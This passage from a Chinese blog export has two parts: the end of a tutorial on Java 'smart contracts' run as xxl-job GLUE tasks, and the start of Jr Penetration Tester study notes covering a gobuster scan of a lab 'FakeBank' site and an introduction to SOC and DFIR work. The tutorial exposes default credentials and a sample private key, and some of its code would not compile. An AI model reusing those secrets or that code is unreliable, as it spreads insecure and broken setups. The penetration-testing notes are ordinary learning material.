<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### web</span><br><span class="line">server.port=7896</span><br><span class="line">server.servlet.context-path=/xxl-job-admin</span><br><span class="line"></span><br><span class="line">### actuator</span><br><span class="line">management.server.servlet.context-path=/actuator</span><br><span class="line">management.health.mail.enabled=false</span><br><span class="line"></span><br><span class="line">### resources</span><br><span class="line">spring.mvc.servlet.load-on-startup=0</span><br><span class="line">spring.mvc.static-path-pattern=/static/**</span><br><span class="line">spring.resources.static-locations=classpath:/static/</span><br><span class="line"></span><br><span class="line">### freemarker</span><br><span class="line">spring.freemarker.templateLoaderPath=classpath:/templates/</span><br><span class="line">spring.freemarker.suffix=.ftl</span><br><span class="line">spring.freemarker.charset=UTF-8</span><br><span class="line">spring.freemarker.request-context-attribute=request</span><br><span class="line">spring.freemarker.settings.number_format=0.##########</span><br><span class="line">spring.freemarker.settings.new_builtin_class_resolver=safer</span><br><span class="line"></span><br><span class="line">### mybatis</span><br><span class="line">mybatis.mapper-locations=classpath:/mybatis-mapper/*Mapper.xml</span><br><span class="line">mybatis.configuration.map-underscore-to-camel-case=true</span><br><span class="line">#mybatis.type-aliases-package=com.xxl.job.admin.core.model</span><br><span class="line"></span><br><span class="line">### xxl-job, datasource</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/xxl_job?useUnicode=true&amp;useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=root</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">### datasource-pool</span><br><span class="line">spring.datasource.type=com.zaxxer.hikari.HikariDataSource</span><br><span class="line">spring.datasource.hikari.minimum-idle=10</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=30</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=30000</span><br><span class="line">spring.datasource.hikari.pool-name=HikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=900000</span><br><span class="line">spring.datasource.hikari.connection-timeout=10000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br><span class="line">spring.datasource.hikari.validation-timeout=1000</span><br><span class="line"></span><br><span class="line">### xxl-job, email</span><br><span class="line">spring.mail.host=smtp.qq.com</span><br><span class="line">spring.mail.port=25</span><br><span class="line">spring.mail.username=xxx@qq.com</span><br><span class="line">spring.mail.from=xxx@qq.com</span><br><span class="line">spring.mail.password=xxx</span><br><span class="line">spring.mail.properties.mail.smtp.auth=true</span><br><span class="line">spring.mail.properties.mail.smtp.starttls.enable=true</span><br><span class="line">spring.mail.properties.mail.smtp.starttls.required=true</span><br><span class="line">spring.mail.properties.mail.smtp.socketFactory.class=javax.net.ssl.SSLSocketFactory</span><br><span class="line"></span><br><span class="line">### xxl-job, access token</span><br><span class="line">xxl.job.accessToken=abbbq.bbc!</span><br><span class="line"></span><br><span class="line">### xxl-job, i18n (default is zh_CN, and you can choose &quot;zh_CN&quot;, &quot;zh_TC&quot; and &quot;en&quot;)</span><br><span class="line">xxl.job.i18n=zh_CN</span><br><span class="line"></span><br><span class="line">## xxl-job, triggerpool max size</span><br><span class="line">xxl.job.triggerpool.fast.max=200</span><br><span class="line">xxl.job.triggerpool.slow.max=100</span><br><span class="line"></span><br><span class="line">### xxl-job, log retention days</span><br><span class="line">xxl.job.logretentiondays=15</span><br><span class="line"></span><br><span class="line">node.ip=192.168.132.1</span><br></pre></td></tr></table></figure>

<p>开启节点项目，观察节点是否成功注册到合约系统</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026161440294.png" alt="image-20241026161440294"></p>
<p>访问<code>http://127.0.0.1:7896/xxl-job-admin/</code>后，使用<code>admin:123456</code>登录</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026161523266.png" alt="image-20241026161523266"></p>
<h4 id="6-2-创建合约"><a href="#6-2-创建合约" class="headerlink" title="6.2. 创建合约"></a>6.2. 创建合约</h4><p>点击任务管理，然后点击右上角新增</p>
<p>需要填写以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">任务描述：随意填写</span><br><span class="line">负责人：随意填写</span><br><span class="line">//私钥和钱包地址前面的在在交易项目已经获取</span><br><span class="line">私钥：区块链项目那边生成的ETH钱包私钥</span><br><span class="line">钱包地址：区块链项目那边生成的ETH钱包地址</span><br><span class="line">运行模式：选择GLUE(Java)我们要用java语言来写智能合约</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026163651849.png" alt="image-20241026163651849"></p>
<p>新增此合约对应的接口，检查上述输入内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/add&quot;)</span></span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="keyword">public</span> ReturnT&lt;String&gt; <span class="title function_">add</span><span class="params">(XxlJobInfo jobInfo)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		jobInfo.setScheduleType(<span class="string">&quot;NONE&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">String</span> <span class="variable">privateKey</span> <span class="operator">=</span> jobInfo.getPrivateKey();</span><br><span class="line">		<span class="type">String</span> <span class="variable">walletAddress</span> <span class="operator">=</span> jobInfo.getWalletAddress();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (privateKey == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(privateKey))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnT</span>&lt;String&gt;(ReturnT.FAIL_CODE,<span class="string">&quot;私钥不能为空&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (walletAddress == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(walletAddress))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnT</span>&lt;String&gt;(ReturnT.FAIL_CODE,<span class="string">&quot;钱包地址不能为空&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">Credentials</span> <span class="variable">credentials</span> <span class="operator">=</span> Credentials.create(privateKey);</span><br><span class="line">		<span class="comment">// 获取 Ethereum 地址</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> credentials.getAddress();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!address.equals(walletAddress))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnT</span>&lt;String&gt;(ReturnT.FAIL_CODE,<span class="string">&quot;私钥与钱包地址不匹配，请检查后再试&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="type">TContract</span> <span class="variable">tContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TContract</span>();</span><br><span class="line">		tContract.setContractContent(jobInfo.getGlueSource());</span><br><span class="line"></span><br><span class="line">		tContract.setWalletAddress(walletAddress);</span><br><span class="line">		<span class="type">String</span> <span class="variable">time</span> <span class="operator">=</span> DateUtil.formatDateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">		tContract.setCreateTime(time);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> encryptSHA1(walletAddress + time);</span><br><span class="line">		tContract.setContractAddress(s);</span><br><span class="line">		System.out.println(s);</span><br><span class="line"></span><br><span class="line">		ReturnT&lt;String&gt; add = xxlJobService.add(jobInfo);</span><br><span class="line">		tContract.setJobId(add.getContent());</span><br><span class="line">		contractDao.save(tContract);</span><br><span class="line"></span><br><span class="line">		System.out.println(<span class="string">&quot;jobId:&quot;</span> + add.getContent());</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> add;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6-3-修改合约内容"><a href="#6-3-修改合约内容" class="headerlink" title="6.3. 修改合约内容"></a>6.3. 修改合约内容</h4><p>点击GLUE IDE到合约修改页面</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026164040215.png" alt="image-20241026164040215"></p>
<p>合约内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.service.impl.ContractServiceImpl;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TradeObject;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TContract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ContractServiceImpl contractServiceImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		XxlJobHelper.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Param</span> <span class="operator">=</span> XxlJobHelper.getJobParam();</span><br><span class="line">        HashMap&lt;String, Object&gt; map = contractServiceImpl.jsonToMap(Param);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        XxlJobHelper.log(map.toString());</span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">trade</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(map.get(<span class="string">&quot;tradeObject&quot;</span>),TradeObject.class);</span><br><span class="line">        <span class="type">TContract</span> <span class="variable">contract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TContract</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        trade.setDataStr(data);</span><br><span class="line">        contract.setId(map.get(<span class="string">&quot;contractId&quot;</span>));</span><br><span class="line">        contract.setData(data);</span><br><span class="line">        contract.setLastData(trade.getLastData());</span><br><span class="line">        contractServiceImpl.setData(contract);</span><br><span class="line">        contractServiceImpl.toChain(trade);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="6-4-调用合约"><a href="#6-4-调用合约" class="headerlink" title="6.4. 调用合约"></a>6.4. 调用合约</h4><p>在需要执行的合约点击右边的操作，点击执行一次。然后在任务参数这里我们需要输入privateKey，以及你想传递给合约的参数，需要以json形式书写。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;privateKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;ced6cc51ee0d2063211564e53012aaac4c0b4978e8cc22a11ed998de4e4bcc3b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026164544315.png" alt="image-20241026164544315"></p>
<h4 id="6-5-合约案例"><a href="#6-5-合约案例" class="headerlink" title="6.5. 合约案例"></a>6.5. 合约案例</h4><ol>
<li><p>最简单的存储参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.service.impl.ContractServiceImpl;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TradeObject;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TContract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ContractServiceImpl contractServiceImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		XxlJobHelper.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Param</span> <span class="operator">=</span> XxlJobHelper.getJobParam();</span><br><span class="line">        HashMap&lt;String, Object&gt; map = contractServiceImpl.jsonToMap(Param);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        XxlJobHelper.log(map.toString());</span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">trade</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(map.get(<span class="string">&quot;tradeObject&quot;</span>),TradeObject.class);</span><br><span class="line">        <span class="type">TContract</span> <span class="variable">contract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TContract</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">		</span><br><span class="line">        data = map.get(<span class="string">&quot;printData&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        trade.setDataStr(data);</span><br><span class="line">        contract.setId(Integer.valueOf(map.get(<span class="string">&quot;contractId&quot;</span>)));</span><br><span class="line">        contract.setData(data);</span><br><span class="line">        contract.setLastData(trade.getLastData());</span><br><span class="line">        contractServiceImpl.setData(contract);</span><br><span class="line">        contractServiceImpl.toChain(trade);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按前文执行一次调用合约，然后区块浏览器查看上链数据</p>
</li>
<li><p>多函数调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.service.impl.ContractServiceImpl;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TradeObject;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TContract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ContractServiceImpl contractServiceImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		XxlJobHelper.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Param</span> <span class="operator">=</span> XxlJobHelper.getJobParam();</span><br><span class="line">        HashMap&lt;String, Object&gt; map = contractServiceImpl.jsonToMap(Param);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        XxlJobHelper.log(map.toString());</span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">trade</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(map.get(<span class="string">&quot;tradeObject&quot;</span>),TradeObject.class);</span><br><span class="line">        <span class="type">TContract</span> <span class="variable">contract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TContract</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">      	<span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> map.get(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">      	<span class="keyword">if</span>(method.equals(<span class="string">&quot;initMethod&quot;</span>))&#123;</span><br><span class="line">        	<span class="type">String</span> <span class="variable">initString</span> <span class="operator">=</span> initMethod();</span><br><span class="line">          	data = initString;</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="keyword">if</span>(method.equals(<span class="string">&quot;others&quot;</span>))&#123;</span><br><span class="line">          	data = <span class="string">&quot;others method&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        trade.setDataStr(data);</span><br><span class="line">        contract.setId(Integer.valueOf(map.get(<span class="string">&quot;contractId&quot;</span>)));</span><br><span class="line">        contract.setData(data);</span><br><span class="line">        contract.setLastData(trade.getLastData());</span><br><span class="line">        contractServiceImpl.setData(contract);</span><br><span class="line">        contractServiceImpl.toChain(trade);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">public</span> String <span class="title function_">initMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="string">&quot;initMethod&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>抽奖程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.service.impl.ContractServiceImpl;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TradeObject;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.example.blockchain.entity.TContract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ContractServiceImpl contractServiceImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        XxlJobHelper.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">Param</span> <span class="operator">=</span> XxlJobHelper.getJobParam();</span><br><span class="line">        HashMap&lt;String, Object&gt; map = contractServiceImpl.jsonToMap(Param);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        XxlJobHelper.log(map.toString());</span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">trade</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(map.get(<span class="string">&quot;tradeObject&quot;</span>),TradeObject.class);</span><br><span class="line">        <span class="type">TContract</span> <span class="variable">contract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TContract</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; participants = map.get(<span class="string">&quot;participants&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成随机数并确定中奖者</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> random.nextInt(participants.size());</span><br><span class="line">        <span class="type">String</span> <span class="variable">winner</span> <span class="operator">=</span> participants.get(index);</span><br><span class="line">        data = winner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        trade.setDataStr(data);</span><br><span class="line">        contract.setId(Integer.valueOf(map.get(<span class="string">&quot;contractId&quot;</span>)));</span><br><span class="line">        contract.setData(data);</span><br><span class="line">        contract.setLastData(trade.getLastData());</span><br><span class="line">        contractServiceImpl.setData(contract);</span><br><span class="line">        contractServiceImpl.toChain(trade);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>Jr Penetration Tester学习</title>
    <url>/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<p>该学习路径涵盖了核心技术技能，使您能够成为一名成功的初级渗透测试员。完成此路径后，您将具备对 Web 应用程序和企业基础设施执行安全评估所需的实用技能。</p>
<span id="more"></span>

<h1 id="Jr-Penetration-Tester学习"><a href="#Jr-Penetration-Tester学习" class="headerlink" title="Jr Penetration Tester学习"></a>Jr Penetration Tester学习</h1><h2 id="网络安全简介"><a href="#网络安全简介" class="headerlink" title="网络安全简介"></a>网络安全简介</h2><h3 id="进攻性安全性简介"><a href="#进攻性安全性简介" class="headerlink" title="进攻性安全性简介"></a>进攻性安全性简介</h3><h4 id="Task1-什么是进攻性安全？"><a href="#Task1-什么是进攻性安全？" class="headerlink" title="Task1 什么是进攻性安全？"></a>Task1 什么是进攻性安全？</h4><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193022229.png"></p>
<h4 id="Task2-入侵您的第一台计算机"><a href="#Task2-入侵您的第一台计算机" class="headerlink" title="Task2 入侵您的第一台计算机"></a>Task2 入侵您的第一台计算机</h4><p>本次任务是破解一个名为 FakeBank 的虚假银行应用程序</p>
<p>使用gobuster进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster -u http://fakebank.com -w wordlist.txt dir</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193700415.png"></p>
<p>发现可以路径<code>/bank-transfer</code>，访问一下发现是类似银行转账</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193828231.png"></p>
<p>按照任务要求将 2000 美元从银行账户 2276 转入您的账户（账号 8881），成功转入我的账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907194035204.png"></p>
<h4 id="Task3-网络安全领域的工作"><a href="#Task3-网络安全领域的工作" class="headerlink" title="Task3 网络安全领域的工作"></a>Task3 网络安全领域的工作</h4><ul>
<li>渗透测试员 - 负责测试技术产品以查找可利用的安全漏洞。</li>
<li>红队成员 - 扮演对手的角色，攻击组织并从敌人的角度提供反馈。</li>
<li>安全工程师 - 设计、监控和维护安全控制、网络和系统，以帮助防止网络攻击。</li>
</ul>
<h2 id="防御性安全简介"><a href="#防御性安全简介" class="headerlink" title="防御性安全简介"></a>防御性安全简介</h2><h3 id="Task1-防御性安全简介"><a href="#Task1-防御性安全简介" class="headerlink" title="Task1 防御性安全简介"></a>Task1 防御性安全简介</h3><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907230449546.png"></p>
<h3 id="Task2-防御性安全领域"><a href="#Task2-防御性安全领域" class="headerlink" title="Task2 防御性安全领域"></a>Task2 防御性安全领域</h3><h4 id="安全运营中心-（SOC）"><a href="#安全运营中心-（SOC）" class="headerlink" title="安全运营中心 （SOC）"></a>安全运营中心 （SOC）</h4><p><em>安全运营中心</em> （SOC） 是一支由网络安全专业人员组成的团队，负责监控网络及其系统以检测恶意网络安全事件。SOC 的一些主要关注领域是：</p>
<ul>
<li>漏洞：每当发现系统漏洞（弱点）时，都必须通过安装适当的更新或补丁来修复它。当修补程序不可用时，应采取必要的措施来防止攻击者利用它。尽管修复漏洞与 SOC 的切身利益息息相关，但不一定分配给他们。</li>
<li>策略冲突：我们可以将安全策略视为保护网络和系统所需的一组规则。例如，如果用户开始将公司的机密数据上传到在线存储服务，则可能违反了策略。</li>
<li>未经授权的活动：考虑用户登录名和密码被盗，攻击者使用它们登录网络的情况。SOC 需要检测到此类事件并尽快阻止它，以免造成进一步的损害。</li>
<li>网络入侵：无论您的安全性有多好，总有入侵的机会。当用户点击恶意链接或攻击者利用公共服务器时，可能会发生入侵。无论哪种方式，当发生入侵时，我们必须尽快检测到它，以防止进一步的损害。</li>
</ul>
<p>安全操作涵盖各种任务以确保保护;其中一项任务是威胁情报。</p>
<blockquote>
<p>在这种情况下，<em>情报</em>是指您收集的有关实际和潜在敌人的信息。<em>威胁</em>是指可能破坏系统或对系统产生不利影响的任何操作。威胁情报旨在收集信息，以帮助公司更好地准备应对潜在对手。目的是实现<em>威胁知情防御</em>。不同的公司有不同的对手。一些攻击者可能试图从移动运营商那里窃取客户数据;然而，其他对手也有兴趣停止炼油厂的生产。示例攻击者包括出于政治原因工作的民族国家网络军队和出于财务目的行事的勒索软件组织。根据公司（目标），我们可以预期对手。</p>
<p>数据收集是从本地来源（如网络日志）和公共来源（如论坛）完成的。数据处理旨在将它们排列成适合分析的格式。分析阶段旨在查找有关攻击者及其动机的更多信息;此外，它旨在创建建议和可操作步骤的列表。</p>
<p>了解您的对手可以让您了解他们的策略、技术和程序。作为威胁情报的结果，我们识别威胁行为者（对手），预测他们的活动，因此，我们将能够缓解他们的攻击并准备响应策略。</p>
</blockquote>
<h4 id="数字取证和事件响应-（DFIR）"><a href="#数字取证和事件响应-（DFIR）" class="headerlink" title="数字取证和事件响应 （DFIR）"></a>数字取证和事件响应 （DFIR）</h4><p>本部分介绍数字取证和事件响应 （DFIR），我们将介绍：</p>
<ul>
<li>数字取证</li>
<li>事件响应</li>
<li>恶意软件分析</li>
</ul>
<h5 id="数字取证"><a href="#数字取证" class="headerlink" title="数字取证"></a>数字取证</h5><p>取证是应用科学来调查犯罪和确定事实。随着计算机和智能手机等数字系统的使用和普及，取证的一个新分支诞生了，用于调查相关犯罪：计算机取证，后来演变为<em>数字取证</em>。</p>
<p>在防御性安全方面，数字取证的重点转移到分析攻击及其肇事者的证据，以及其他领域，例如知识产权盗窃、网络间谍和拥有未经授权的内容。因此，数字取证将侧重于不同的领域，例如：</p>
<ul>
<li>文件系统：分析系统存储的数字取证图像（低级副本）可以揭示许多信息，例如已安装的程序、创建的文件、部分覆盖的文件和已删除的文件。</li>
<li>系统内存：如果攻击者在内存中运行恶意程序，但未将其保存到磁盘，则获取系统内存的取证图像（低级副本）是分析其内容并了解攻击的最佳方式。</li>
<li>系统日志：每个客户端和服务器计算机都维护着不同的日志文件，说明发生了什么。日志文件提供了有关系统上所发生情况的大量信息。即使攻击者试图清除他们的痕迹，也会留下一些痕迹。</li>
<li>网络日志：遍历网络的网络数据包的日志将有助于回答有关是否发生攻击及其后果的更多问题。</li>
</ul>
<h5 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h5><p><em>事件</em>通常是指数据泄露或网络攻击;但是，在某些情况下，它可能不太重要，例如配置错误、入侵尝试或违反策略。网络攻击的示例包括攻击者使我们的网络或系统无法访问、污损（更改）公共网站以及数据泄露（窃取公司数据）。您将如何<em>应对</em>网络攻击？事件响应 指定了处理此类情况应遵循的方法。目的是在尽可能短的时间内减少损害和恢复。理想情况下，您将制定一个为事件响应做好准备的计划。</p>
<p>事件响应过程的四个主要阶段是：</p>
<ol>
<li>准备：这需要一支经过培训并准备好处理事件的团队。理想情况下，采取各种措施来从一开始就防止事件发生。</li>
<li>检测和分析： 团队拥有检测任何事件所需的资源;此外，必须进一步分析任何检测到的事件以了解其严重性。</li>
